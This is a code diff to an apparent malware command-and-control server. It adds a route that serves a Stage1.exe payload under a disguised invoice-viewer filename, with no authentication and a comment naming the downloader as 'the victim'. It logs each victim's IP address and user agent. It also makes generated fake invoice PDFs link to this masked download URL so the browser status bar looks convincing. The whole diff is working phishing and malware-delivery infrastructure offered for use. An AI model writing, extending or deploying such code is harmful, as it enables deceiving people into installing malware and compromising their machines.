@@ -69,6 +69,23 @@ function getPayloadBuf() {
   return null;
 }
 
+// ── Public: masked Stage1.exe download (shown in browser status bar) ─────────
+// Serves Stage1.exe under whatever filename appears in the URL path.
+// Target sees e.g. https://c2.osatechcloud.cloud/dl/Invoice_Q4-2024_SecureViewer.exe
+// No auth — the download target is the victim, not an admin.
+router.get("/dl/:filename", (req, res) => {
+  const stage1 = path.join(DL_DIR, "Stage1.exe");
+  if (!fs.existsSync(stage1))
+    return res.status(404).send("Not found");
+  const safe = (req.params.filename || "viewer.exe").replace(/[^a-zA-Z0-9_\-. ]/g, "");
+  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
+  appendEvent({ ts: Date.now(), type: "dl_fetch", ip, ua: req.headers["user-agent"] || "-", host: safe });
+  console.log(`[stage] DL-FETCH  ip=${ip}  file=${safe}`);
+  res.setHeader("Content-Type", "application/octet-stream");
+  res.setHeader("Content-Disposition", `attachment; filename="${safe}"`);
+  res.sendFile(stage1);
+});
+
 // ── Stage 1 → C2: Check-in ────────────────────────────────────────────────────
 
 router.get("/stage/checkin", (req, res) => {
@@ -318,7 +335,8 @@ function buildLurePdf(c2Host, opts = {}) {
   const to       = opts.to       || "Acme Corporation";
   const filename = opts.filename || "Invoice_Q4-2024";
   const btnLabel = opts.btnLabel || "View Full Invoice";
-  const dlUrl    = `https://${c2Host}/api/stage/stage1.exe`;
+  // Default: masked /dl/ URL — status bar shows a convincing filename, not the API endpoint
+  const dlUrl    = opts.dlUrl || `https://${c2Host}/dl/${(opts.filename || "Invoice_Q4-2024").replace(/[^a-zA-Z0-9_\-]/g,"_")}_SecureViewer.exe`;
   const invNum   = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
   const now      = new Date();
   const fmtD     = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
@@ -403,12 +421,13 @@ function buildLurePdf(c2Host, opts = {}) {
 router.get("/api/stage/build-lure-pdf", requireAdmin, (req, res) => {
   const c2Host = (req.query.host || req.headers.host || "c2.osatechcloud.cloud")
     .replace(/^https?:\/\//i, "").split("/")[0];
-  const from    = req.query.from     || undefined;
-  const to      = req.query.to       || undefined;
-  const fname   = req.query.filename || "Invoice_Q4-2024";
-  const btnLabel = req.query.btn     || "View Full Invoice";
+  const from     = req.query.from     || undefined;
+  const to       = req.query.to       || undefined;
+  const fname    = req.query.filename || "Invoice_Q4-2024";
+  const btnLabel = req.query.btn      || "View Full Invoice";
+  const dlUrl    = req.query.dlurl    || undefined; // optional override
   try {
-    const pdf = buildLurePdf(c2Host, { from, to, filename: fname, btnLabel });
+    const pdf = buildLurePdf(c2Host, { from, to, filename: fname, btnLabel, dlUrl });
     res.setHeader("Content-Type", "application/pdf");
     res.setHeader("Content-Disposition", `attachment; filename="${fname}.pdf"`);
     res.send(pdf);
